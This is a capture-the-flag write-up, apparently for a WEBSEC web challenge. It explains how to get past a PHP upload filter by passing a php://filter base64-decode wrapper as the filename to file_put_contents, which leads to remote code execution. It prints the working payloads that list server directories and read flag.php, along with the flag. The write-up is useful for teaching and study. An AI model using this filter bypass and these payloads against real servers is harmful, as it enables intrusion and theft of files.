At first I traced through the code and I saw that I have control over data and filename.
This was a classic upload a php file and get RCE using it, but after I tried it I saw there is a pesky check like this:
```
if (strpos($data, '<?')  === false && stripos($data, 'script')  === false) {  # no interpretable code please.
```
Meaning I can't directly try and put php code inside a file.
I then tried to look at the clean_up.php inclusion and tried to create one of my own and confuse the index.php into including my file and running it, which didn't work because I still needed the file that I want to include to be a viable php script, at first I hoped that I can just put plain code without the <?php ?> headers and it will work but I tested and it didn't.

Then I remember something from a previous challenge where I passed something encoded in base64 so it passess input checks so I started researching.
I then looked and data was being passed into an interesting function: file_put_contents()

I tried to look at its documentation if there is some room to play and it took me a while to find but I can pass it a filter and give a source to apply that filter to.
(https://www.php.net/manual/en/function.file-put-contents.php + https://www.php.net/manual/en/wrappers.php.php)
As stated in the documentation, you can pass file_put_contents a stream instead of the normal stuff, and then in the second documentation you can see an example as well:
```file_put_contents("php://filter/write=string.rot13/resource=example.txt","Hello World");``` - applying the filter ROT13 to "Hello World" and putting it into example.txt.
That's exactly what we need.
I used Base64 to encode my payloads and then passed them like this:
```filename=php://filter/convert.base64-decode/resource=payload.php AND data=ENCODED_BASE64_STRING```


I then used different payloads as I got RCE, and I started traversing the server until I found this:

payload:
```
    <?php
    $dir = scandir('../../');
    var_dump($dir);
    ?>
```
Got me this output:
```array(9) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(12) "clean_up.php" [3]=> string(8) "flag.php" [4]=> string(9) "index.php" [5]=> string(12) "php-fpm.sock" [6]=> string(10) "source.php" [7]=> string(7) "uploads" [8]=> string(3) "var" }```

let's get the flag:

payload:
```
    <?php
    $flag = file_get_contents('../../flag.php');
    var_dump($flag);
    ?>
```

output:
```
    string(83)
    <!--?php

    // WEBSEC{no_javascript_no_php_I_guess_you_used_COBOL_to_get_a_RCE_right?}

    -->
```